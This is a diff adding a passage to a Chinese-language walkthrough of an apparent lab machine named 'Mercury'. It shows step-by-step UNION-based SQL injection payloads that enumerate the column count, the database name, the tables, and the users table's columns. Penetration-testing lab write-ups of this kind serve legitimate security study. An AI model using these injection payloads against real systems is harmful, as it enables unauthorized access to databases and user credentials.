@@ -61,3 +61,33 @@ gobuster dir -u "http://192.168.174.135:8080" -w "/usr/share/wordlists/dirbuster
 瞬间觉得此处应该存在sql注入（这里是“数字型注入“，不是”字符型注入“）
 
 ![image-20260526213302216](Mercury.assets/image-20260526213302216.png)
+
+进行注入
+
+```
+1 order by 1;--+
+```
+
+发现只有一列，那就不需要占位符
+
+```
+1 union select database();--+
+```
+
+数据库是'mercury'
+
+```
+1 union select table_name from information_schema.tables where table_schema='mercury';--+
+```
+
+![image-20260526214329401](Mercury.assets/image-20260526214329401.png)
+
+看到有两个表，分别是'users','facts'
+
+```
+1 union select column_name from information_schema.columns where table_name='users';--+
+```
+
+![image-20260526214521492](Mercury.assets/image-20260526214521492.png)
+
+三列，分别是'id','password','username'
